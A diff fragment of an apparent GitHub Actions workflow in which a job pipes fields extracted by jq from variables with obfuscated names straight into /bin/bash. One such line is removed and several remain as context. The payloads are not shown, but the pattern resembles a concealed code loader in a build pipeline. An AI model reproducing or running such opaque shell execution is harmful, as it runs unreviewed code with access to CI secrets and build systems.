@@ -48,7 +48,6 @@ jobs:
           echo $h5872 | jq -r .g2 | /bin/bash
           printf '%s' "$u817" | jq -r .pjka149 | /bin/bash
           printf '%s' "$xsrje64430" | jq -r .knwv779 | /bin/bash
-          printf '%s' "$b39" | jq -r .p67456 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
